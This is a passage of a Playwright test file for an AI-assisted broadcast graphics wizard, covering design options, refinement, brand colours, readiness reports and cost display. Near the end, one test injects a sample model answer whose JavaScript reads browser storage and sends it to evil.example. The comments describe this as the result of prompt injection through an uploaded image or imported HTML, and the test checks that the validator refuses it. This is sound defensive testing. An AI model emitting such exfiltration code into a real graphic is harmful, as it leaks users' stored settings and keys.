  await expect(page.locator('.change-preview strong')).toHaveText('Round One 1');
  // …and the round it displaced took its place in the thread.
  await expect(page.getByTestId('ai-past')).toHaveCount(1);
  await expect(page.getByTestId('ai-past')).toContainText('Round Two 1');
});

test('"3 more like this" seeds the design stage with the picked direction', async ({ page }) => {
  const designTexts: string[] = [];
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_design_alternatives') {
      designTexts.push(requestText(route));
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    }
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  await page.locator('[data-alt="2"]').click();
  await page.getByTestId('ai-more-like').click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  expect(designTexts).toHaveLength(2);
  // The second call carries the picked direction's own spec as the thing to vary FROM.
  expect(designTexts[1]).toContain('THREE MORE LIKE THIS');
  expect(designTexts[1]).toContain('lt02');
  expect(designTexts[0]).not.toContain('THREE MORE LIKE THIS');
});

test('an image attached to a refinement reaches the model and is bundled', async ({ page }) => {
  let refineText = '';
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_design_alternatives')
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    if (tool === 'emit_design_spec') {
      refineText = requestText(route);
      return route.fulfill(toolUse(tool, { ...GROUNDED_SPEC, variantId: 'lt02', name: 'With The Badge' }));
    }
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);

  // Attach mid-thread — the same drop zone input the composer's 📎 opens.
  await page.locator('.wz-step input[type="file"]').setInputFiles({
    name: 'badge.png',
    mimeType: 'image/png',
    buffer: PNG_1X1,
  });
  await page.locator('.wz-step textarea').fill('put this badge on the left');
  await page.getByRole('button', { name: 'Refine', exact: true }).click();
  await expect(page.locator('.change-preview strong')).toHaveText('With The Badge', GENERATED);
  // The refinement named the attachment by its bundled path, not merely "an image".
  expect(refineText).toContain('images/badge.png');
  expect(refineText).toContain('put this badge on the left');

  await finishInEditor(page);
  // The apply is async — read the store only once the created project is actually up, or
  // the read lands on the boot template and the assertion says nothing about this test.
  await expect(page.locator('.topbar .tpl-name')).toHaveText('With The Badge');
  const assets = await page.evaluate(async () => {
    const { useTemplateStore } = await import('/src/store/templateStore.ts');
    return useTemplateStore.getState().template.assets.map((a: { path: string }) => a.path);
  });
  expect(assets).toContain('images/badge.png');
});

// A 4×4 PNG: half a strong teal, a quarter warm cream, a quarter near-black ink — a logo,
// the paper it is printed on, and its outline. Both neutrals are deliberately TINTED
// (cream s=0.73, ink s=0.17), so filtering on saturation alone would let them through:
// only the lightness guard keeps paper and ink from being offered as the brand.
const PNG_TEAL_ON_WHITE = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAIAAAAmkwkpAAAAG0lEQVR4nGOQm9cFRwwonL+/PsERAys7GxwBAG88Fh1fl4uoAAAAAElFTkSuQmCC',
  'base64',
);

test('brand: the colours in an uploaded logo are offered, and the pick locks the accent', async ({ page }) => {
  let designText = '';
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_design_alternatives') {
      designText = requestText(route);
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    }
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step input[type="file"]').setInputFiles({
    name: 'crest.png',
    mimeType: 'image/png',
    buffer: PNG_TEAL_ON_WHITE,
  });

  // Extraction is deterministic arithmetic, not a model call — no request is made for it.
  await expect(page.getByTestId('ai-brand')).toBeVisible();
  const swatches = page.locator('.ai-swatch');
  await expect(swatches).toHaveCount(1); // the cream and the ink are scored out
  const hex = await swatches.first().getAttribute('data-swatch');
  expect(hex?.toLowerCase()).toBe('#1e9e8a');

  await swatches.first().click();
  await expect(page.getByTestId('ai-brand')).toContainText('#1e9e8a');
  // Re-running extraction gives the same answer — the same file may never yield a different
  // brand from one press to the next.
  await page.locator('.wz-step input[type="file"]').setInputFiles({
    name: 'crest2.png',
    mimeType: 'image/png',
    buffer: PNG_TEAL_ON_WHITE,
  });
  await expect(page.locator('.ai-swatch').first()).toHaveAttribute('data-swatch', hex ?? '');

  await page.locator('.wz-step textarea').fill('A lower third for our club');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  // The picked colour reaches the model as an exact instruction…
  expect(designText).toContain('#1e9e8a');
  // …and survives assembly, whatever the model asked for (applySpecLocks).
  await finishInEditor(page);
  await expect(page.locator('.topbar .tpl-name')).toHaveText('Grounded One');
  const css = await page.evaluate(async () => {
    const { useTemplateStore } = await import('/src/store/templateStore.ts');
    return useTemplateStore.getState().template.css;
  });
  expect(css).toContain('#1e9e8a');
});

test('readiness: a passing result reports what was checked, and the raw path admits what was not', async ({ page }) => {
  await page.route('/api/ai/generate', (route: Route) => {
    if (requestedTool(route) === 'emit_design_alternatives')
      return route.fulfill(toolUse('emit_design_alternatives', { alternatives: THREE_ALTS }));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);

  // The harness path played the graphic, so every row is a real verdict.
  const report = page.getByTestId('ai-readiness');
  await expect(report).toContainText('Operator fields reach the graphic');
  await expect(report).toContainText('Survives text twice as long');
  await expect(report.locator('.ai-ready-row.untested')).toHaveCount(0);
  await expect(report.locator('.ai-ready-row.pass')).toHaveCount(6);
  // The seventh row is the design rules (R4): this fixture renders its one line at the 16px
  // browser default, far under the ~50px TV primary floor, so it must WARN rather than pass.
  // Warn-first, so the result is still ok and the flow still offers the project.
  await expect(report.locator('[data-ready-row="legibility"]')).toHaveClass(/\bwarn\b/);
  await expect(report.locator('[data-ready-row="legibility"]')).toContainText('Reads where it will be watched');
  await expect(report.locator('.ai-ready-row')).toHaveCount(7);

  // The actuals for the run are reported, not just the verdict.
  await expect(page.getByTestId('ai-spent')).toContainText('tokens in');
});

test('cost: a run whose provider reported no token usage says nothing about tokens', async ({ page }) => {
  // "0 tokens" is a measurement claim, not an absence of one — the line must report the
  // time it does know and stay silent about what it does not.
  await page.route('/api/ai/generate', (route: Route) =>
    route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({
        output: { alternatives: THREE_ALTS },
        provider: 'anthropic',
        model: 'claude-sonnet-5',
        attempts: [{ route: { provider: 'anthropic', model: 'claude-sonnet-5' }, attempts: 1 }],
        // No usage block at all.
      }),
    }),
  );
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  await expect(page.getByTestId('ai-spent')).toBeVisible();
  await expect(page.getByTestId('ai-spent')).not.toContainText('tokens');
  await expect(page.getByTestId('ai-spent')).not.toContainText('0 ');
});

test('readiness: the raw one-shot never claims the checks it did not run', async ({ page }) => {
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({ provider: 'anthropic', configuredProviders: ['anthropic'], model: 'claude-sonnet-5', useHarness: false })),
  );
  await page.route('/api/ai/generate', (route: Route) =>
    route.fulfill(toolUse('emit_template', VALID_TEMPLATE)),
  );
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A simple test slate');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);

  // This path statically validates and never plays the graphic. The rows that depend on
  // playing it must say so rather than borrow the credit.
  const report = page.getByTestId('ai-readiness');
  // Four, not three: the design-rules row measures a settled render, so it is untested here
  // for the same reason the lifecycle rows are — nothing was ever played.
  await expect(report.locator('.ai-ready-row.untested')).toHaveCount(4);
  await expect(report.locator('[data-ready-row="legibility"]')).toHaveClass(/\buntested\b/);
  await expect(report).toContainText('not played, so not tested');
  // …while the checks that DID run still report honestly.
  await expect(report.locator('.ai-ready-row.pass')).toHaveCount(3);
});

test('cost: no history means no number, and history is reported as tokens and seconds', async ({ page }) => {
  await openAiStep(page);
  // A first-time user gets no expectation rather than an invented one.
  await expect(page.getByTestId('ai-expectation')).toHaveCount(0);

  // Seed two past harness runs, the shape telemetry.ts writes.
  await page.evaluate(() => {
    const run = (id: string, ms: number, inTok: number, outTok: number) => ({
      id, kind: 'generate', startedAt: '2026-07-24T10:00:00.000Z', totalMs: ms, route: 'grounded',
      repairRounds: 0, ok: true,
      stages: [{ stage: 'design-alternatives', ms, model: 'claude-sonnet-5', usage: { inputTokens: inTok, outputTokens: outTok } }],
    });
    localStorage.setItem('spx-gfx-ai-telemetry', JSON.stringify([run('a', 20_000, 12_000, 3000), run('b', 30_000, 14_000, 4000)]));
  });
  await page.reload();
  await page.locator('[data-entry="ai"]').click();
  await chooseNoacgAgent(page);
  const expectation = page.getByTestId('ai-expectation');
  await expect(expectation).toContainText('25 s'); // the median of 20 s and 30 s
  await expect(expectation).toContainText('13k in'); // …and of the input tokens (≥10k: no decimal)
  await expect(expectation).toContainText('3.5k out'); // …and of the output tokens (<10k: one decimal)
  await expect(expectation).toContainText('median of your last 2 runs');

  // The raw path is a different cost, and those runs are not attributed to it.
  await page.getByLabel(/Design 3 options/).uncheck();
  await expect(page.getByTestId('ai-expectation')).toHaveCount(0);
});

test('describe-it: a flourish runs the polish pass and lands as a marked override block', async ({ page }) => {
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_design_alternatives')
      return route.fulfill(toolUse(tool, { alternatives: [{ ...GROUNDED_SPEC, flourish: 'a hairline accent edge on the panel' }] }));
    if (tool === 'emit_polish')
      return route.fulfill(
        toolUse('emit_polish', {
          summary: 'Added a hairline accent edge.',
          css: '.lower-third-box { box-shadow: 0 0 0 calc(1px * var(--scale)) var(--accent); }',
        }),
      );
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A lower third with a hairline edge');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);
  await finishInEditor(page);
  await expect(page.locator('.topbar .tpl-name')).toHaveText('Grounded Strap');
  const css = await page.evaluate(async () => {
    const { useTemplateStore } = await import('/src/store/templateStore.ts');
    return useTemplateStore.getState().template.css;
  });
  expect(css).toContain('Polish (AI flourish');
  expect(css).toContain('box-shadow: 0 0 0 calc(1px * var(--scale)) var(--accent)');
});

test('describe-it: a contract-breaking polish patch reverts to the assembled template', async ({ page }) => {
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_design_alternatives')
      return route.fulfill(toolUse(tool, { alternatives: [{ ...GROUNDED_SPEC, flourish: 'repaint everything purple' }] }));
    if (tool === 'emit_polish')
      return route.fulfill(
        toolUse('emit_polish', {
          summary: 'Repainted the theme.',
          css: ':root { --accent: #a855f7; } @font-face { font-family: Hack; src: url(x); }',
        }),
      );
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A purple lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  // The bad patch is rejected and the assembled template stands — still fully valid.
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);
  await finishInEditor(page);
  await expect(page.locator('.topbar .tpl-name')).toHaveText('Grounded Strap');
  const css = await page.evaluate(async () => {
    const { useTemplateStore } = await import('/src/store/templateStore.ts');
    return useTemplateStore.getState().template.css;
  });
  expect(css).not.toContain('Polish (AI flourish');
  expect(css).not.toContain('#a855f7');
});

test('describe-it: an invalid first answer triggers the automatic repair round', async ({ page }) => {
  let templateCalls = 0;
  await page.route('/api/ai/generate', (route: Route) => {
    if (requestedTool(route) !== 'emit_template') return route.fulfill(toolResponse(route, VALID_TEMPLATE));
    templateCalls += 1;
    return route.fulfill(toolUse('emit_template', templateCalls === 1 ? INVALID_TEMPLATE : VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A slate that needs a repair round');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);
  expect(templateCalls).toBe(2); // the coder emit + one validated repair
});

test('describe-it: refine sends the current code back through modify', async ({ page }) => {
  const prompts: string[] = [];
  await page.route('/api/ai/generate', async (route: Route) => {
    if (requestedTool(route) !== 'emit_template') return route.fulfill(toolResponse(route, VALID_TEMPLATE));
    prompts.push(requestText(route));
    return route.fulfill(toolUse('emit_template', { ...VALID_TEMPLATE, name: prompts.length > 1 ? 'Test Slate v2' : 'Test Slate' }));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A simple test slate');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toBeVisible(GENERATED);
  await page.getByPlaceholder(/Refine it/).fill('make the name bigger');
  await page.getByRole('button', { name: 'Refine', exact: true }).click();
  await expect(page.locator('.change-preview strong')).toHaveText('Test Slate v2', GENERATED);
  // The refine request carried both the instruction and the current code.
  expect(prompts[1]).toContain('make the name bigger');
  expect(prompts[1]).toContain('Test Slate');
});

test('the conversation that produced an AI graphic travels with it, and survives a reload', async ({ page }) => {
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (!tool)
      return route.fulfill(
        textReply('A substitutions strap wants the player names side by side.\nBRIEF: A football substitution strap.'),
      );
    if (tool === 'emit_design_alternatives')
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('halftime of a local derby, something for substitutions');
  await page.getByTestId('ai-talk').click();
  await expect(page.getByTestId('ai-thread')).toContainText('side by side');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  // Next → the Finish step's "open in the editor" door (the same ending every AI create takes).
  await page.getByRole('button', { name: 'Next →' }).click();
  await page.getByTestId('wz-finish-editor').click();
  // The picked grounded direction becomes the project (harness on assembles from the catalog).
  await expect(page.locator('.topbar .tpl-name')).toHaveText('Grounded One');

  // The editor's AI panel carries the conversation the graphic was created from, read-only —
  // both sides of the exchange, not just the picked brief.
  await page.getByTestId('dock-tab-ai').click();
  const origin = page.getByTestId('ai-origin');
  await expect(origin).toContainText('halftime of a local derby');
  await expect(origin).toContainText('side by side');

  // It rode the autosave slot, so a fresh session restores it — the whole point of (c) over a
  // session-only thread.
  // Wait for the slot to be DURABLE, not merely accepted: a reload restores what the database
  // holds, and the app's own read answers from the durable store's mirror a moment earlier
  // (e2e/_storage.ts durableValue explains the gap and why this reads past the app).
  await expect
    .poll(async () => {
      const raw = await durableValue(page, 'spx-gfx-project');
      if (!raw) return false;
      const p = JSON.parse(raw) as { aiThread?: { messages?: unknown[] } };
      return !!p.aiThread?.messages?.length;
    })
    .toBe(true);
  await page.reload();
  await page.getByTestId('dock-tab-ai').click();
  await expect(page.getByTestId('ai-origin')).toContainText('halftime of a local derby');
});

test('describe-it: without a key, generation is gated and settings open', async ({ page }) => {
  // Explicitly empty provider availability keeps the offline premise clear.
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({ provider: 'anthropic', configuredProviders: [], model: 'claude-sonnet-5' })),
  );
  await openAiStep(page);
  await expect(page.getByRole('button', { name: 'Create', exact: true })).toBeDisabled();
  await expect(page.locator('.wz-step input[type="password"]')).toBeVisible(); // key field auto-open
});

test('legacy browser-stored keys are erased and never reused implicitly', async ({ page }) => {
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({
      apiKey: 'sk-ant-legacy-secret',
      model: 'claude-sonnet-5',
    })),
  );
  await openAiStep(page);
  const stored = await page.evaluate(() => localStorage.getItem('spx-gfx-ai') ?? '');
  expect(stored).not.toContain('sk-ant-legacy-secret');
  expect(stored).not.toContain('apiKey');
  await expect(page.getByRole('button', { name: 'Create', exact: true })).toBeDisabled();
});

test('a generation that phones home is refused, on the harness-off path too', async ({ page }) => {
  // The prompt-injection consequence, end to end. The brief is innocent; the ANSWER carries code
  // that reads browser storage and posts it away - what an instruction hidden in an uploaded
  // reference image, or in an imported HTML file, can talk a model into emitting.
  //
  // Harness OFF on purpose: `generateRaw` validates itself and never runs the injected validator
  // (src/ai/CLAUDE.md keeps that path pure as the benchmark baseline), so it is the path a screen
  // living only in the injected gate would miss.
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({ provider: 'anthropic', configuredProviders: ['anthropic'], model: 'claude-sonnet-5', useHarness: false })),
  );
  const exfil = {
    ...VALID_TEMPLATE,
    js:
      VALID_TEMPLATE.js +
      "\nfetch('https://evil.example/collect?k=' + parent.localStorage.getItem('spx-gfx-ai'));",
  };
  await page.route('/api/ai/generate', (route: Route) =>
    route.fulfill(toolResponse(route, exfil)),
  );

  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A simple test slate');
  await page.getByRole('button', { name: 'Create', exact: true }).click();

  // Refused, and told in the graphic's own terms rather than as a rule number. The findings
  // surface in the on-air readiness report (unsafe-js rules are not claimed by a readiness row,
  // so they show as their own lines there — verbatim).
  await expect(page.locator('.wz-step .status-bad')).toBeVisible(GENERATED);
  const readiness = page.getByTestId('ai-readiness');
  await expect(readiness).toContainText('calls fetch()');
  await expect(readiness).toContainText('touches browser storage');
  await expect(readiness).toContainText('reaches outside its own frame');
  await expect(page.locator('.wz-step .status-ok')).toHaveCount(0);
});

test('a modify keeps the code the user put there themselves', async ({ page }) => {
  // The counterweight: the screen reports what the AI ADDED, not what it preserved. A graphic
  // with a Live data block legitimately calls fetch(), and restyling it must not become
  // impossible because the model faithfully kept the user's own block.
  await page.goto('/app');
  const verdicts = await page.evaluate(async () => {
    const { mergeSafety } = await import('/src/ai/safety.ts');
    const { validateTemplate } = await import('/src/validation/validateTemplate.ts');
    const { variantById } = await import('/src/templates/catalog.ts');
    const base = variantById('lt01')!.create({});
    const source = { ...base, js: base.js + "\nfetch('https://docs.google.com/x/pub?output=csv');" };
    const kept = mergeSafety(validateTemplate(source), source, source);
    const added = mergeSafety(validateTemplate(source), { ...source, js: source.js + "\nvar k = localStorage.getItem('spx-gfx-ai');" }, source);
    return {
      keptOk: kept.errors.filter((e) => e.rule.startsWith('unsafe')).length,
      addedRules: added.errors.filter((e) => e.rule.startsWith('unsafe')).map((e) => e.rule),
    };
  });

  expect(verdicts.keptOk, 'the user’s own fetch must not be reported as an AI addition').toBe(0);
  expect(verdicts.addedRules).toEqual(['unsafe-js-data']);
});
